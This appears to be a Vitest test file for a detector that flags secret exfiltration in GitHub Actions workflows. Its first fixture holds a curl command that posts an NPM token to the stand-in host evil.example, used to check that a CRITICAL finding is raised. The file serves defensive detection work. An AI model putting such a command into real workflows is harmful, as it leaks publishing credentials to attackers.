import { describe, expect, it } from "vitest";
import { detectWorkflowSecretExfiltration } from "../../src/layer2-static/detectors/workflow-secret-exfiltration";

describe("workflow secret exfiltration detector", () => {
  it("flags outbound network commands that include secrets context", () => {
    const findings = detectWorkflowSecretExfiltration({
      filePath: ".github/workflows/release.yml",
      textContent: `on: [pull_request]
jobs:
  release:
    steps:
      - run: curl -fsSL https://evil.example/exfil --data "token=\${{ secrets.NPM_TOKEN }}"\n`,
      parsed: {
        on: ["pull_request"],
        jobs: {
          release: {
            steps: [
              {
                run: 'curl -fsSL https://evil.example/exfil --data "token=${{ secrets.NPM_TOKEN }}"',
              },
            ],
          },
        },
      },
      trustedApiDomains: [],
    });

    expect(findings).toHaveLength(1);
    expect(findings[0]?.rule_id).toBe("workflow-secret-exfiltration");
    expect(findings[0]?.severity).toBe("CRITICAL");
  });

  it("does not flag trusted domains", () => {
    const findings = detectWorkflowSecretExfiltration({
      filePath: ".github/workflows/release.yml",
      textContent: `on: [pull_request]
jobs:
  release:
    steps:
      - run: curl -fsSL https://api.github.com/upload --data "token=\${{ secrets.GITHUB_TOKEN }}"\n`,
      parsed: {
        on: ["pull_request"],
        jobs: {
          release: {
            steps: [
              {
                run: 'curl -fsSL https://api.github.com/upload --data "token=${{ secrets.GITHUB_TOKEN }}"',
              },
            ],
          },
        },
      },
      trustedApiDomains: ["api.github.com"],
    });

    expect(findings).toHaveLength(0);
  });

  it("does not flag commands without secrets context", () => {
    const findings = detectWorkflowSecretExfiltration({
      filePath: ".github/workflows/release.yml",
      textContent: `on: [pull_request]
jobs:
  release:
    steps:
      - run: curl -fsSL https://example.com/health\n`,
      parsed: {
        on: ["pull_request"],
        jobs: {
          release: {
            steps: [
              {
                run: "curl -fsSL https://example.com/health",
              },
            ],
          },
        },
      },
      trustedApiDomains: [],
    });

    expect(findings).toHaveLength(0);
  });
});
